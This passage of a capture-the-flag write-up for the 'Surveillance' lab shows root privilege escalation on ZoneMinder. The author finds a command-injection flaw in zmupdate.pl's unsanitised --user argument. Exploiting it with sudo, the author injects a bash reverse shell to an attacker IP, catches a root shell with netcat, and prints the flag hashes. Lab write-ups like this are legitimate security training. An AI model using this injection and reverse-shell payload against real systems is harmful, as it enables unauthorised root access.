 * Support:        https://ubuntu.com/advantage

  System information as of Sat Dec 16 04:26:07 PM UTC 2023

  System load:  0.0166015625      Processes:             259
  Usage of /:   84.8% of 5.91GB   Users logged in:       0
  Memory usage: 24%               IPv4 address for eth0: 10.129.57.44
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Dec  5 12:43:54 2023 from 10.10.14.40
matthew@surveillance:~$ id
uid=1000(matthew) gid=1000(matthew) groups=1000(matthew)
matthew@surveillance:~$ cat user.txt
8b30daf0e99e2637285179c7acb37d26
```

# Root Flag
---

## From matthew to root


### Foothold

Remember the sudoers rules for user `zoneminder`? 

I gave up trying that since I haven't got user flag at that time, now it doesn't seem to be a rabbit hole

Next move is to check if any user input leads to command injection

### Analyze zoneminder perl scripts

To get a list of functions that could execute system commands, 

Google : `perl functions to execute system command`

> https://bioinformaticsreview.com/20180506/how-to-execute-unix-shell-commands-in-a-perl-script/

Check the functions one by one to filter out false positives

```bash
grep -i 'exec' $(ls /usr/bin/zm[a-zA-Z]*.pl) -E5
grep -i 'sysyem' $(ls /usr/bin/zm[a-zA-Z]*.pl) -E5
grep -i 'eval' $(ls /usr/bin/zm[a-zA-Z]*.pl) -E5
```

By checking for `qx`, found out `/usr/bin/zmupdate.pl` have a function `patchDB()` that is vulnerable to command injection

```bash
grep -i 'qx' $(ls /usr/bin/zm[a-zA-Z]*.pl) -E5
```

The command variable starts with `mysql`

```perl
my $command = 'mysql';
```

We can specify `$dbUser` to execute commands since it wasn't sanitized

```perl
  if ($super) {
    $command .= ' --defaults-file=/etc/mysql/debian.cnf';
  } elsif ($dbUser) {
    $command .= ' -u'.$dbUser;
    $command .= ' -p\''.$dbPass.'\'' if $dbPass;
  }
```

```perl
  print("Executing '$command'\n") if logDebugging();
  ($command) = $command =~ /(.*)/; # detaint
  my $output = qx($command);
```

For `patchDB` to be called, we need to specify version

![](/assets/obsidian/0785ffa449619f97a32675584906359e.png)

### Command injection in zmupdate.pl

```bash
zoneminder@surveillance:/usr/share/zoneminder/www$ sudo /usr/bin/zmupdate.pl --help
Unknown option: help
Usage:
    zmupdate.pl -c,--check | -f,--freshen | -v<version>,--version=<version>
    [-u <dbuser> -p <dbpass>]

Options:
    -c, --check - Check for updated versions of ZoneMinder -f, --freshen -
    Freshen the configuration in the database. Equivalent of old zmconfig.pl
    -noi --migrate-events - Update database structures as per
    USE_DEEP_STORAGE setting. -v <version>, --version=<version> - Force
    upgrade to the current version from <version> -u <dbuser>,
    --user=<dbuser> - Alternate DB user with privileges to alter DB -p
    <dbpass>, --pass=<dbpass> - Password of alternate DB user with
    privileges to alter DB -s, --super - Use system maintenance account on
    debian based systems instead of unprivileged account -d <dir>,
    --dir=<dir> - Directory containing update files if not in default build
    location -interactive - interact with the user -nointeractive - do not
    interact with the user
```

```bash
zoneminder@surveillance:/usr/share/zoneminder/www$ sudo /usr/bin/zmupdate.pl -v 2 --user '$(/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.30/443 0>&1")'

Initiating database upgrade to version 1.36.32 from version 2

WARNING - You have specified an upgrade from version 2 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort :

Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : y
Creating backup to /tmp/zm/zm-2.dump. This may take several minutes.
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Surveillance]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.30] from (UNKNOWN) [10.129.230.42] 48514
root@surveillance:/usr/share/zoneminder/www# id
uid=0(root) gid=0(root) groups=0(root)
root@surveillance:/usr/share/zoneminder/www# cat /root/root.txt
f0ae9fa51066143bb06a0ef75383295a
```

# Additional
---
